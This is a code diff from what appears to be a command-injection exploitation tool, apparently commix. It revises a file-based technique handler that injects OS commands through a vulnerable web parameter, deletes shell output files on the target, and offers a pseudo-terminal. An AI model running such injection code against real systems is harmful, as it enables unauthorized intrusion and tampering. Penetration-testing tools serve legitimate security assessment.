@@ -68,11 +68,13 @@ __Warning:__ This technique is still experimental, is not yet fully functional a
 Delete previous shells outputs.
 """
 def delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
+  if menu.options.verbose:
+    print "",
   if settings.TARGET_OS == "win":
-    cmd = settings.WIN_DEL + OUTPUT_TEXTFILE + " " + separator + settings.WIN_COMMENT
-  else: 
+    cmd = settings.WIN_DEL + OUTPUT_TEXTFILE
+  else:
     settings.SRV_ROOT_DIR = ""
-    cmd = settings.DEL + settings.SRV_ROOT_DIR + OUTPUT_TEXTFILE
+    cmd = settings.DEL + settings.SRV_ROOT_DIR + OUTPUT_TEXTFILE + settings.COMMENT
   response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
 
 """
@@ -144,7 +146,7 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method, u
 
             # Check if defined "--verbose" option.
             if menu.options.verbose:
-              sys.stdout.write("\n" + Fore.GREY + settings.PAYLOAD_SIGN + payload.replace("\n", "\\n") + Style.RESET_ALL)
+              print Fore.GREY + settings.PAYLOAD_SIGN + payload.replace("\n", "\\n") + Style.RESET_ALL
                 
             # Cookie Injection
             if settings.COOKIE_INJECTION == True:
@@ -352,8 +354,9 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method, u
               print "  (+) Technique : " + Fore.YELLOW + Style.BRIGHT + technique.title() + Style.RESET_ALL + ""
               print "  (+) Payload : " + Fore.YELLOW + Style.BRIGHT + re.sub("%20", " ", payload.replace("\n", "\\n")) + Style.RESET_ALL
               
+              # Delete previous shell (text) files (output) from temp.
+              delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)  
               if settings.TARGET_OS == "win":
-                delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)  
                 time.sleep(1)
                 
               # Check for any enumeration options.
@@ -411,10 +414,8 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method, u
                 go_back = False
                 go_back_again = False
                 while True:
-                  # Delete previous shell (text) files (output) from temp.
-                  delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
-                  if menu.options.verbose:
-                  	print ""
+                  # if menu.options.verbose:
+                  #   print ""
                   if go_back == True:
                     break
                   gotshell = raw_input(settings.QUESTION_SIGN + "Do you want a Pseudo-Terminal? [Y/n/q] > ").lower()
